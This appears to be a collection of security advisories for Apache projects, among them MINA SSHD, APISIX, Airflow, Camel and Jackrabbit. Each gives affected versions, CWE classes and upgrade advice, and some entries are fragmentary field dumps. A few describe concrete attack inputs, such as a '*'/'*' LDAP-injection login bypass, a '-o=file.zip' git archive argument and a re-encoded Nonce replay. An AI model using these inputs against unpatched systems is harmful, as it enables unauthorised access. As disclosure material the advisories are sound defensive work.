Jackrabbit WebDAV server attaches a cached authenticated session on any Lock-Token/TransactionId/SubscriptionId/If-header field token match with

no credential check.



This issue affects Apache Jackrabbit: from 2.23.0 through 2.23.5, from 2.22.0 through 2.22.4, from 2.20.0 through 2.20.17.












Users are recommended to upgrade to versions 2.23.6, 2.22.5, or 2.20.18 which fix the issue.
cwe: CWE-384 CWE-384: Session Fixation / Session Reuse across Users

title: Apache Jackrabbit: DavEx client runs Class.forName + (String)-constructor on server-controlled error bodies
description:
— Use of Externally-Controlled Input to Select Classes or Code vulnerability in Apache Jackrabbit's WebDAV/Davex client.

A malicious WebDAV/DavEx server, or an attacker able to intercept the connection, can cause the client to instantiate arbitrary classes from its classpath, which can lead to arbitrary file creation or truncation.

Only applications that use jackrabbit-spi2dav (directly or through jackrabbit-jcr2dav) to connect to a remote repository are affected. Jackrabbit servers are not affected.

Category: unsafe reflection on wire data (HIGH).



This issue affects Apache Jackrabbit: from 2.23.0 through 2.23.5, from 2.22.0 through 2.22.4, from 2.20.0 through 2.20.17.



Users are recommended to upgrade to versions 2.23.6, 2.22.5, or 2.20.18 which fix the issue.
cwe: CWE-470 CWE-470 — Use of Externally-Controlled Input to Select Classes or Code

title: Apache Qpid Broker-J: Type size/count handling can lead to excessive allocation pre-authentication in the AMQP 0-8/0-9/0-9-1 decoder
description:
A pre-authentication attacker could leverage type size/count handling to cause excessive allocation leading to potential denial of service.

This issue affects Apache Qpid Broker-J: through 10.1.0.

Users are recommended to upgrade to version 10.1.1, which fixes the issue.

description:

description:

title: Apache Qpid Broker-J: Uncontrolled resource consumption during AMQP delivery decompression, message conversion and HTTP management JSON rendering
description:
Improper handling of compressed data in the shared GZIP decompressor used for AMQP 0-8/0-9/0-9-1 and AMQP 0-10 message delivery, message conversion and HTTP management JSON rendering allows authenticated message producers to exhaust memory and disrupt broker availability via processing without a decompressed-output limit.

Users are recommended to upgrade to version 10.1.1, which fixes the issue.
cwe: CWE-409 CWE-409 Improper handling of highly compressed data (data amplification)

title: Apache Qpid Broker-J: Incomplete property conversion handling from AMQP 1.0 to AMQP 0-10
description:
Improper handling of property-encoding exceptions in AMQP 1.0-to-AMQP 0-10 message conversion allows authenticated message producers to disrupt delivery to AMQP 0-10 consumers via message properties that the target encoder does not handle correctly.

This issue affects Apache Qpid Broker-J: through 10.1.0.

Users are recommended to upgrade to version 10.1.1, which fixes the issue.

title: Apache Qpid Broker-J: Missing HTTP-session renewal after successful authentication
description:
Session fixation in HTTP management authentication allows remote attackers to gain unauthorized access to an authenticated management session via reuse of a session identifier retained across successful authentication.

This issue affects Apache Qpid Broker-J: through 10.1.0.

Users are recommended to upgrade to version 10.1.1, which fixes the issue.
cwe: CWE-384 CWE-384 Session fixation

Use of uninitialized resource, Return of wrong status code vulnerability in Apache Thrift C++ WebSocket server.

Users are recommended to upgrade to version 0.25.0, which fixes the issue.

title: Apache OFBiz: REST API authentication bypassed by default when the auth attribute is omitted from a .rest.xml operation
description:
Incorrect default value in the REST API framework's .rest.xml definition parser (ModelApiReader) in Apache OFBiz through 24.09.07 on all platforms allows a remote, unauthenticated attacker to invoke a REST API operation without providing valid credentials via a .rest.xml resource or operation definition that omits the auth attribute, which ModelApiReader incorrectly resolves to false instead of the true default declared by rest-api.xsd.

Users are recommended to upgrade to version 24.09.08, which fixes this issue.
cwe: CWE-306 CWE-306 Missing authentication for critical function
CWE-1188 CWE-1188 Initialization of a resource with an insecure default

title: Apache WSS4J: UsernameToken replay protection bypassed by re-encoding the Nonce
description: Apache WSS4J remembers the Nonce of each UsernameToken it accepts, so a captured token cannot be reused. It stored the Nonce as raw base64 text, but authentication decodes that text and uses the bytes.The same bytes can be written as base64 in several ways. An attacker who captured an authenticated request could re-send it with a space added to the Nonce: the password digest still verified, but the token no longer matched the remembered one, so the replay was accepted. Since a UsernameToken does not cover the message body, the captured token could then be reused on requests of the attacker's choosing until it expired. Affects deployments with a nonce replay cache configured, as Apache CXF has by default, and only tokens using a password digest. The cache is now keyed on the decoded Nonce. Users are recommended to upgrade to versions 4.0.2 or 3.0.6 or 2.4.4, which fix this issue.
cwe: CWE-180 CWE-180 Incorrect behavior order: validate before canonicalize
CWE-290 CWE-290 Authentication Bypass by Spoofing

title: Apache Tomcat: Possible TLS 1.3 connection failures
description:
Incomplete cleanup vulnerability in Apache Tomcat could cause TLS 1.3 connections to fail intermittently.



This issue affects Apache Tomcat: from 11.0.0-M21 through 11.0.26, from 10.1.25 through 10.1.60, from 9.0.90 through 9.0.122.



Users are recommended to upgrade to version 11.0.27, 10.1.61 or 9.0.123, which fix the issue.
cwe: CWE-459 CWE-459 Incomplete cleanup

description: Integer overflow in mod_dav_fs in Apache HTTP Server through 2.4.68 allows an authenticated WebDAV client with write access to crash worker processes and persistently corrupt a directory's property database via PROPPATCH requests declaring many XML namespaces.

credits: AISLE in partnership with Red Hat

title: Apache Impala: Stored XSS in Impala query plans
description: An SQL user using Impala up to and including version 4.5.2 with only SELECT permission can put JavaScript in a table alias and make it run in another user's browser when that user opens the query plan in Impala's Web UI. This is stored XSS (CWE-79). Users are recommended to upgrade to version 4.5.3.
cwe: CWE-79 CWE-79 Improper neutralization of input during web page generation ('cross-site scripting')

Stack-based buffer overflow, Incorrect bitwise shift of integer vulnerability in Apache Thrift C++ THeaderProtocol.



This issue affects Apache Thrift: before 0.25.0.

CWE-835 CWE-835

CWE-772 CWE-772 Missing release of resource after effective lifetime

title: Apache MINA SSHD: Repeated-publickey policy bypass on server
description:
Apache MINA SSHD is a Java library for client-side and server-side SSH. SSH servers can be configured to require multi-authentication schemes, for instance two different public keys, not just one. In OpenSSH, this would be done by setting in sshd_config AuthenticationMethods "publickey,publickey". Apache MINA SSHD provides an equivalent configuration mechanism.




In Apache MINA SSHD versions up to 2.19.0 and 3.0.0-M1 to 3.0.0-M5 the server code in component sshd-core does not enforce that the two public keys presented are different. A user can thus successfully authenticate with only one of the two key pairs required by presenting this single key twice. This is a partial authentication bypass.






Users are recommended to upgrade to version 2.20.0 or 3.0.0-M6, which fix this issue.
cwe: CWE-304 CWE-304 Missing critical step in authentication

title: Apache MINA SSHD: Remote execution of JGit "archive -o=file.zip" can write file on the server
description:
Improper input validation in sshd-git in Apache MINA SSHD, versions up to 2.19.0 and 3.0.0-M1 to 3.0.0-M5. Apache 
MINA SSHD is a Java library for client-side and server-side SSH.




Component org.apache.sshd:sshd-git provides though class GitPgmCommandFactory a way to configure an Apache MINA SSHD server such 
that authenticated SSH clients can remotely execute git commands via the JGit library 
on git repositories stored on the server. In CVE-2026-58624 this mechanism was restricted to only a few git commands, including "git archive" without "--output" or "-o" options such that the resulting archive would not be written on the server but instead sent back to the client over the SSH connection.




The fix done for CVE-2026-58624 was insufficient as it missed removing the single-argument "-o=file.zip" version of the command parameter from the "archive" command.




Users are recommended to upgrade to version 2.20.0 or 3.0.0-M6, which fix this issue.
cwe: CWE-20 CWE-20 Improper Input Validation

title: Apache MINA SSHD: Memory exhaustion DoS via unbounded SCP command line read
description:
Uncontrolled resource consumption in component ssd-scp in Apache MINA SSHD versions up to 2.19.0 or 3.0.0-M1 to 3.0.0-M5. Apache MINA SSHD is a Java library for client-side and server-side SSH.




Component sshd-scp of Apache MINA SSHD provides a Java implementation of SCP. The SCP command protocol is line-oriented with LF-terminated lines. The protocol handler in sshd-scp did not impose any limit on the length of such protocol lines. A malicious peer just sending a junk command containing a never-ending sequence of characters but never a LF would cause the receiver to allocate memory to store this whole junk command, exhausting memory and crashing the application with an OutOfMemoryError.




Users are recommended to upgrade to version 2.20.0 or 3.0.0-M6, which fix this issue by enforcing an upper limit on the length of SCP protocol lines.
cwe: CWE-770 CWE-770 Allocation of resources without limits or throttling

title: Apache MINA SSHD: Memory exhaustion in SFTP client via unsolicited SFTP replies
description:
Possible memory exhaustion in SFTP clients (DefaultSftpClient) in component sshd-sftp in Apache MINA SSHD versions 0.9.0 to 2.19.0 and 3.0.0-M1 to 3.0.0-M5.




Apache 
MINA SSHD is a Java library for client-side and server-side SSH. The sshd-sftp component provides support for SFTP.




The SFTP client implementation, when receiving a reply, did not check that this reply corresponded to a request sent earlier. Unsolicited replies would be stored but never consumed. A malicious server could keep sending unsolicited replies until available memory in the client was exhausted.




Users are recommended to upgrade to version 2.20.0 or 3.0.0-M6, which fix this issue.
cwe: CWE-770 CWE-770 Allocation of resources without limits or throttling

title: Apache MINA SSHD: Memory exhaustion in SFTP v6 check-file-name/check-file-handle extension
description:
Server-side memory exhaustion in Apache MINA SSHD 1.0.0 to 2.19.0 and 3.0.0-M1 to 3.0.0-M5, component sshd-sftp, in the SFTP v6 check-file-name/check-file-handle extension. Apache MINA SSHD is a Java library for client-side and server-side SSH.




Using a very small "block size" (for instance 256, which is the minimum) on a huge file generates many (file size / block size) hashes. The resulting SFTP reply message was accumulated fully in memory server-side, which could, with a suitably large (possibly sparse) file exhaust the server-side memory, taking down the server.




Users are recommended to upgrade to version 2.20.0 or 3.0.0-M6, which fix this issue by imposing a maximum limit on the size of the reply. Many SFTP implementations have a general limit on the size of SFTP messages anyway; typically 256kB as in OpenSSH or also in Apache MINA SSHD.
cwe: CWE-770 CWE-770 Allocation of resources without limits or throttling

title: Apache MINA SSHD: LDAP password authentication ineffective
description:
A missing check in LdapPasswordAuthenticator in component sshd-ldap in Apache MINA SSHD versions 1.2.0 to 2.19.0 or 3.0.0-M1 to 3.0.0-M5 bypassed authentication checks.




Apache MINA SSHD is a Java library for client-side and server-side SSH. The optional sshd-ldap component provides support for integrating password and publickey authentication on the server side with an LDAP server.




sshd-ldap is an optional component. SSH servers implemented with Apache MINA SSHD are affected only if they use sshd-ldap and do configure an LdapPasswordAuthenticator to be used for password authentication. Normal password authentication via the built-in mechanisms in sshd-core is _not_ affected by this vulnerability, which concerns only LdapPasswordAuthenticator.




Users are recommended to upgrade affected applications to version 2.20.0 or 3.0.0-M6, which fix this issue.
cwe: CWE-304 CWE-304 Missing critical step in authentication

title: Apache MINA SSHD: LDAP injection in sshd-ldap
description:
Authentication bypass via LDAP injection in component sshd-ldap in Apache MINA SSHD versions 1.2.0 to 2.19.0 and 3.0.0-M1 to 3.0.0-M5.




Apache MINA SSHD is a Java library for client-side and server-side SSH. 
The optional sshd-ldap component provides support for integrating 
password and publickey authentication on the server side with an LDAP 
server.




sshd-ldap is an optional component. SSH servers implemented with Apache 
MINA SSHD are affected only if they use sshd-ldap and do configure it to be used for password of public key authentication.

Other Apache MINA SSHD servers are not affected.




Lack of escaping LDAP filter metacharacters enabled successful authentication with username "*" and password "*".




Users are recommended to upgrade affected applications to version 2.20.0 or 3.0.0-M6, which fix this issue by properly escaping filter parameters according to RFC 4515.
cwe: CWE-90 CWE-90 Improper neutralization of special elements used in an LDAP query ('LDAP injection')
CWE-305 CWE-305 Authentication bypass by primary weakness

title: Apache Commons BCEL: Class repositories cache class files under their self-declared names, enabling cache poisoning
description:
Symbolic name not mapping to correct class.



BCEL caches attacker-controlled classes under their self-declared names without validating the requested name, allowing subsequent lookups and name-keyed verification results to refer to a different class.



This issue affects Apache Commons BCEL: before 6.13.0.



Users are recommended to upgrade to version 6.13.0, which fixes the issue.
cwe: CWE-386 CWE-386 Symbolic name not mapping to correct object

title: Apache Storm: Supervisor page discloses worker placement of other users' topologies
description: Nimbus returns the worker placement of every topology running on a supervisor, including the host, port, owner and resource assignment of topologies the caller is not authorized to read. In a multi-tenant cluster, an authenticated user who is allowed to access Nimbus can learn where the workers of other users' topologies run. Users are recommended to upgrade to version 3.2.0, which fixes the issue.
cwe: CWE-862 CWE-862 Missing Authorization

title: Apache Airflow SSH provider, Apache Airflow SFTP provider: SSH hook disables host-key verification by default
description:
The Apache Airflow SSH provider hook disables SSH host-key verification by default: unless `host_key` is configured or `no_host_key_check` is explicitly set to false, it accepts any server key. This affects SSH and SFTP connections that rely on the default. An attacker in a machine-in-the-middle position between the worker and the SSH or SFTP server can impersonate the server and capture the credentials or data a task sends.

Users of apache-airflow-providers-ssh and apache-airflow-providers-sftp are recommended to upgrade to apache-airflow-providers-ssh 7.0.0 and apache-airflow-providers-sftp 7.0.0 or later. The deferrable SFTP code paths had the same default and are covered separately by CVE-2026-94135; apache-airflow-providers-sftp 7.0.0 fixes both.
cwe: CWE-322 CWE-322: Key Exchange without Entity Authentication

title: Apache Airflow SFTP provider: Async SFTP hook disables host-key verification by default
description:
The Apache Airflow SFTP provider's deferrable code paths (`SFTPTrigger`, `SFTPHookAsync`, `SFTPClientPool`) disable SSH host-key verification by default unless the connection explicitly sets `no_host_key_check` to false. Deployments that run SFTP sensors or operators in deferrable mode are affected. An attacker in a machine-in-the-middle position between the triggerer and the SFTP server can impersonate the server and capture the credentials or data exchanged.

Users of apache-airflow-providers-sftp are recommended to upgrade to apache-airflow-providers-sftp 7.0.0 or later. This is a separate defect from CVE-2026-94134 (the synchronous SSH hook default, which also affects the SFTP hook); users who applied the fix for one also need this release for the other - apache-airflow-providers-sftp 7.0.0 fixes both.
cwe: CWE-322 CWE-322: Key Exchange without Entity Authentication

title: Apache APISIX: unauthenticated impersonation issue in saml-auth
description:
Improper verification of cryptographic signature vulnerability in Apache APISIX.



Any unauthenticated attacker could impersonate any user on every route protected by the saml-auth plugin under default configuration. This issue affects Apache APISIX: from 3.17.0 through 3.18.0.



Users are recommended to upgrade to version 3.19.0, which fixes the issue.
cwe: CWE-347 CWE-347 Improper verification of cryptographic signature

title: Apache APISIX: session fixation issue in feishu-auth and dingtalk-auth plugin
description:
Cross-Site request forgery (CSRF) vulnerability in feishu-auth and dingtalk-auth plugins in Apache APISIX.



An attacker who can get a user to click a crafted link may cause that user's browser session on a protected route to be established under the attacker's identity instead of their own. Any work the user then performs in that session, including uploads, form submissions, and account bindings, lands in the attacker's account. This issue affects Apache APISIX: from 3.17.0 through 3.18.0.



Users are recommended to upgrade to version 3.19.0, which fixes the issue.
cwe: CWE-352 CWE-352 Cross-Site request forgery (CSRF)

title: Apache Sling Security Bundle: RefererFilter accepts weaker-than-origin evidence
description:
A vulnerability in Apache Sling Security Bundle: the ReferrerFilter accepts weaker-than-orgin evidence.



This issue affects Apache Sling Security Bundle: before 1.3.2.



Users are recommended to upgrade to version 1.3.2, which fixes the issue.
cwe: CWE-346 CWE-346

title: Apache APISIX: Batch response aggregation can exhaust worker memory
description:
Allocation of resources without limits or throttling vulnerability in batch-requests plugin in Apache APISIX.



An unauthenticated caller can drive a gateway worker into OOM via a route where the batch-requests plugin is used and the batch endpoint is publicly exposed. This issue affects Apache APISIX: from 1.3.0 through 3.18.0.



Users are recommended to upgrade to version 3.19.0, which fixes the issue.

title: Apache Sling Security Bundle: ContentDispositionFilter mediates only one address/API shape of a resource
description:
A vulnerability in Apache Sling Security Bundle: ContentDispositionFilter mediates only one address/API shape of a resource



This issue affects Apache Sling Security Bundle: before 1.3.12.



Users are recommended to upgrade to version 1.3.12, which fixes the issue.

title: Apache APISIX: Servlet-style normalization creates a route/upstream authorization mismatch
description:
Use of Non-Canonical URL paths for authorization decisions vulnerability in Apache APISIX.



In some configurations where a permissive route overlaps a protected one, a crafted encoded path can reach an upstream endpoint that the matched route's policies were never meant to cover. A request that should have been rejected is served instead, giving unauthenticated access to a protected upstream endpoint. This issue affects Apache APISIX: from 2.14.1 through 3.18.0.



Users are recommended to upgrade to version 3.19.0, which fixes the issue.
cwe: CWE-647 CWE-647 Use of Non-Canonical URL paths for authorization decisions

title: Apache APISIX: Openid-connect introspection validation issue
description:
Improper Authentication vulnerability in Apache APISIX.

On a route using openid-connect plugin with remote introspection against an authorization server that serves multiple issuers, a token that introspects as active for one issuer may get accepted on a route restricted to another. This issue affects Apache APISIX: from 3.12.0 through 3.18.0.

Users are recommended to upgrade to version 3.19.0, which fixes the issue.
cwe: CWE-287 CWE-287 Improper Authentication

title: Apache MINA: CVE-2026-47065 resolveProxyClass fix missing from 2.0.X and 2.1.X branches (2.0.30 / 2.1.14) ZDRES-232
description:
The fix for CVE-2026-47065/ZDRES-232 ("resolveProxyClass Not Overridden - acceptMatchers Filter Bypass via java.lang.reflect.Proxy"), released on 2026-06-02 and announced as "Fully addressed" in MINA 2.2.8, 2.1.13 and 2.0.29, was committed to the
 2.2.X branch only. The 2.0.X and 2.1.X maintenance branches never received the resolveProxyClass() override, so the 2.0.29 and 2.1.13 artifacts listed as fixed -- and every later release on those lines, up to and including the current 2.0.30 and 2.1.14 -- remain vulnerable to the exact allow-list bypass that CVE-2026-47065 was meant to close.
cwe: CWE-502 CWE-502 Deserialization of untrusted data

title: Apache Camel: Camel-OAuth Cross-Scope Token Reuse via an Under-Keyed JVM-Global Client Credentials Token Cache
description:
Use of Cache Containing Sensitive Information vulnerability in Apache Camel Oauth component.



This issue affects Apache Camel: from 4.19.0 before 4.22.2.



OAuthClientCredentialsTokenResolver obtains OAuth 2.0 bearer tokens through the client credentials grant on behalf of the components that authenticate their outbound calls with a named OAuth profile, such as camel-openai, camel-langchain4j-agent, camel-huggingface, camel-docling, camel-a2a, camel-spring-ai-chat and the IBM watsonx components, and of applications that call the OAuthClientAuthenticationFactory SPI directly. It kept the tokens it obtained in a static cache shared by every resolver instance and every CamelContext in the JVM, and keyed that cache on the token endpoint and the client ID only, although the token request also carries the client secret and the requested scope. Two profiles that share a token endpoint and a client ID but request different scopes, or authenticate with different client secrets, therefore mapped to the same cache entry: the profile that resolved a token first populated the entry, and the other profile was then handed that token, with no token request made under its own configuration, for as long as the token remained valid. Token caching is enabled by default, and pointing several profiles at one identity provider client is an ordinary use of the profile support rather than an opt-in to an insecure setting. The outcome is an outbound request that carries a token issued for another profile's scope, which can grant broader authority than the calling profile was configured for, or reach a service the token was not issued for; with identity providers that derive a token's audience from the requested scope, a different scope can mean a token for a different service altogether. A profile configured with a different client secret was likewise served the token obtained with the other secret, without authenticating with its own. The profiles are configured by the deployment, which is trusted, so no untrusted input reaches the cache: the party that gains is the service that receives a token it was not meant to receive, which, if hostile or compromised, can replay that token within its scope. Reaching the issue requires a deployment that defines more than one profile sharing a token endpoint and client ID while differing in scope or client secret.

Users are recommended to upgrade to version 4.23.0, which fixes the issue. If users are on the 4.22.x releases stream, then they are suggested to upgrade to 4.22.2. The 4.19.x to 4.21.x release lines reached end of life before this issue was resolved and will not receive a fix, so deployments on them must move to a supported release. For deployments that cannot upgrade immediately, disable token caching on every OAuth profile that shares a token endpoint and client ID with another profile, by setting camel.oauth.NAME.cache-tokens=false for a named profile or camel.oauth.cache-tokens=false for the default one, so that each resolution requests a token with that profile’s own scope and client secret, at the cost of a token request on every resolution. Alternatively, register a separate client at the identity provider for each profile that needs a different scope or client secret, so that no two such profiles share a client ID.
cwe: CWE-524 CWE-524 Use of Cache Containing Sensitive Information

references.name: CVE-2026-85317, the same class of defect in the camel-http OAuth2 client token cache

solutions: Upgrade to Apache Camel 4.23.0, which fixes the issue. Users on the 4.22.x stream should upgrade to 4.22.2. The 4.19.x to 4.21.x release lines reached end of life before this issue was resolved and will not receive a fix, so deployments on them must move to a supported release. The token cache is now keyed on every input of the token request: the token endpoint, the client ID, a SHA-256 fingerprint of the client secret, so that the raw secret is not kept in the cache, and the requested scope, so profiles that differ in credentials or scope obtain separate tokens while equivalent profiles still share one. The 4.18.x line and earlier never carried the client credentials token resolver and are not affected.
workarounds: Disable token caching on every OAuth profile that shares a token endpoint and client ID with another profile, by setting camel.oauth.NAME.cache-tokens=false for a named profile or camel.oauth.cache-tokens=false for the default one, so that each resolution requests a token with that profile's own scope and client secret, at the cost of a token request on every resolution. Alternatively, register a separate client at the identity provider for each profile that needs a different scope or client secret, so that no two such profiles share a client ID.

Users are recommended to upgrade to versions 4.0.2 or 3.0.6 or 2.4.4, which fix this issue.
